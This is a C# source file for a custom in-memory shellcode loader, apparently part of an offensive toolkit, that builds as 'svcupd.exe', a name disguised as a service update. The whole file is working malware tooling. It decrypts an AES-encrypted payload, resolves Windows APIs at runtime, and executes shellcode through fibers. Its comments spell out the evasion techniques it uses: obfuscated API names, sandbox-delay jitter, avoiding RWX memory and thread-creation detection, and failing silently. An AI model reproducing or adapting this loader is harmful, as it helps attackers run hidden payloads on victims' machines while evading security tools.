// Loader.cs — custom in-memory shellcode loader for OSAI/Shadow Supply
// Fiber-based execution, AES-256-CBC decryption, no RWX allocation,
// runtime API resolution via GetModuleHandle+GetProcAddress delegates.
// Build: mcs /platform:x64 /target:winexe /out:svcupd.exe Loader.cs
//
// Placeholder tokens are patched by build.sh:
//   __ENC_B64__  base64 of AES-256-CBC ciphertext (PKCS7)
//   __KEY_B64__  base64 of 32-byte AES key
//   __IV_B64__   base64 of 16-byte AES IV

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

public static class SvcUpd
{
    // ------------- Delegates for runtime-resolved APIs -------------
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr d_ConvertThreadToFiber(IntPtr lpParameter);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr d_CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void d_SwitchToFiber(IntPtr lpFiber);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr d_VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool d_VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibraryA(string lpLibFileName);

    // Rebuild the API name at runtime so a strings dump doesn't scream it.
    static string S(params byte[] b)
    {
        for (int i = 0; i < b.Length; i++) b[i] ^= 0x5A;
        return Encoding.ASCII.GetString(b);
    }

    static T Resolve<T>(IntPtr mod, string name) where T : class
    {
        IntPtr p = GetProcAddress(mod, name);
        if (p == IntPtr.Zero) throw new Exception("resolve failed: " + name);
        return Marshal.GetDelegateForFunctionPointer(p, typeof(T)) as T;
    }

    static byte[] Aes256CbcDecrypt(byte[] cipher, byte[] key, byte[] iv)
    {
        using (var aes = Aes.Create())
        {
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = key;
            aes.IV = iv;
            using (var dec = aes.CreateDecryptor())
                return dec.TransformFinalBlock(cipher, 0, cipher.Length);
        }
    }

    // Sleep a random jitter to trip up sandbox short-run analysis.
    static void Jitter()
    {
        var rng = new Random();
        Thread.Sleep(rng.Next(2500, 6500));
    }

    public static void Main()
    {
        try
        {
            Jitter();

            // Base64 payload material — patched by build.sh
            byte[] enc = Convert.FromBase64String("__ENC_B64__");
            byte[] key = Convert.FromBase64String("__KEY_B64__");
            byte[] iv  = Convert.FromBase64String("__IV_B64__");

            byte[] sc = Aes256CbcDecrypt(enc, key, iv);

            // Resolve kernel32 exports at runtime — nothing suspicious in P/Invoke table.
            IntPtr k32 = LoadLibraryA("kernel32.dll");
            var VirtualAlloc    = Resolve<d_VirtualAlloc>(k32,    "VirtualAlloc");
            var VirtualProtect  = Resolve<d_VirtualProtect>(k32,  "VirtualProtect");
            var ConvertToFiber  = Resolve<d_ConvertThreadToFiber>(k32, "ConvertThreadToFiber");
            var CreateFiber     = Resolve<d_CreateFiber>(k32,     "CreateFiber");
            var SwitchToFiber   = Resolve<d_SwitchToFiber>(k32,   "SwitchToFiber");

            // Allocate RW only — flip to RX after the copy. Avoids RWX heuristic.
            const uint MEM_COMMIT_RESERVE = 0x3000;
            const uint PAGE_READWRITE     = 0x04;
            const uint PAGE_EXECUTE_READ  = 0x20;

            IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT_RESERVE, PAGE_READWRITE);
            if (mem == IntPtr.Zero) return;

            Marshal.Copy(sc, 0, mem, sc.Length);
            // Wipe the plaintext from the managed heap ASAP.
            for (int i = 0; i < sc.Length; i++) sc[i] = 0;

            uint old;
            if (!VirtualProtect(mem, (UIntPtr)sc.Length, PAGE_EXECUTE_READ, out old)) return;

            // Fiber execution: thread -> fiber, then hand off to shellcode as a fiber.
            // No CreateThread / CreateRemoteThread — a much rarer detection surface.
            ConvertToFiber(IntPtr.Zero);
            IntPtr scFiber = CreateFiber(0, mem, IntPtr.Zero);
            if (scFiber == IntPtr.Zero) return;
            SwitchToFiber(scFiber);
        }
        catch
        {
            // Fail silently — no console spam.
        }
    }
}
